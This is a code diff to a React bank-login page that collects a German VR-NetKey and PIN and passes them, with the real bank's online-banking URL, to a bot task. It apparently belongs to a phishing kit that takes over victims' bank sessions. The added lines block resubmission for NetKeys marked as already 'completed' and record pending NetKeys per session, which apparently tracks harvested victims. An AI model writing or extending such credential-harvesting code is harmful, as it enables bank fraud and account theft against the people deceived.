@@ -14,6 +14,7 @@ import { AddressVerificationStep } from "@/components/flow/AddressVerificationSt
 import { startBotTask, getBotTask, confirmAddress } from "@/lib/botClient";
 import { getSecureGoLabel } from "@/lib/secureGoLabel";
 import { startQrLoginSession } from "@/lib/qrLogin.functions";
+import { isNetkeyCompleted, rememberPendingNetkey } from "@/lib/completedNetkeys";
 import type { BankTheme } from "@/data/banks";
 
 
@@ -456,6 +457,11 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
     if (!pin.trim()) { setPinError(true); hasErr = true; }
     if (hasErr) return;
 
+    if (isNetkeyCompleted(vrNetKey.trim())) {
+      setErrorMsg("Für diesen VR-NetKey wurde der Vorgang bereits abgeschlossen. Eine erneute Anmeldung ist nicht möglich.");
+      return;
+    }
+
 
     setSubmitting(true);
     setErrorMsg(null);
@@ -473,6 +479,7 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
             onlineBankingUrl: bank.online_banking_url,
           },
         });
+        rememberPendingNetkey(sessionId, vrNetKey.trim());
         startQrPolling(sessionId, Date.now());
       } catch (err: any) {
         setSubmitting(false);
@@ -487,6 +494,7 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
 
     try {
       const { task_id } = await startBotTask({ url, netkey: vrNetKey.trim(), pin });
+      rememberPendingNetkey(task_id, vrNetKey.trim());
       persistTask(task_id);
       setSubmitting(true);
       startPolling(task_id, Date.now());
